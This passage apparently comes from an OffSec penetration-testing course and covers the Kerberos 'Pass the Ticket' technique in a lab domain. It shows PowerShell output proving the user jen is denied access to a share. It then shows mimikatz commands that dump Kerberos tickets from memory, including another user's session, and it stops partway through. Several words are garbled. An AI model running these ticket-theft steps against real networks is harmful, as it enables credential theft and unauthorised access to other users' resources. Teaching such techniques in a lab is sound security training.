# OffSec

As evidenced by the output, we have successfully reused the Kerberos TGT to launch a command shell on the files04 server.

Excellent! We have successfully upgraded a cached NTLM password hash to a Kerberos TGT to gain remote code execution on behalf of another user.

# 23.1.5 Pass the Ticket

In the previous section, we used the hash technique (along with the captured NTLM hash) to acquire a Kerberos TGT, allowing us to authenticate as Kerberos. We can only use the TGT on the machine it was created for, but the TGS potentially offers more flexibility.

The *Pass the Ticket* attack takes advantage of the TGS, which can be exported and re- elsewhere on the network and then used to authenticate to a specific service. In addition, if the service tickets belong to the current user, no administrative privileges are required.

In this scenario, we are going to abuse an already existing session of *ave*. The dave user has privilege access to the backup folder on WEB04 where our logged in *jen* does not.

To demonstrate the attack angle, we are going to extract all the current TGT/TGS in memory and inject *ave*'s TGT into our own session. This will allow us to access the restricted folder.

Let's first log in as *jen* to CLIENT76 and verify that we are able to access the resource on WEB04. To do, we will list the content of the \web04\backup folder from an administrative PowerShell command line.

```
PS C:\Windows\system32> whoami
corp\jen
PS C:\Windows\system32> ls \\web04\backup
is : Access to the path '\\web04\backup' is denied.
At line:1
+ ls \\web04\backup
  - CategoryInfo : PermissionDenied:( \web04:backup:String) [ChildItem],UnauthorizedAccessException
  + FullyQualifiedError:
DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItem
```

Listing 846 - Verify that the user jen has no access to the shared folder

Confirming that *jen* has no access to the restricted folder, we can now launch mimikatz, enable debug privileges, and dump all the TGT/TGS from memory with the sekurlsa:tickets /export command.

```
#privilege::debug
Privilege '20' OK
#sekurlsa:tickets /export
```

```
Authentication ID : 0 : 2837286 (00000000:001f1626)
Session : Batch from 0
User Name : dave
Domain : CORP
Logon Server : DC1
Logon Time : 9/14/2022 6:24:17 AM
SID : S-1-5-21-198730270-658905905-178184369-1693
```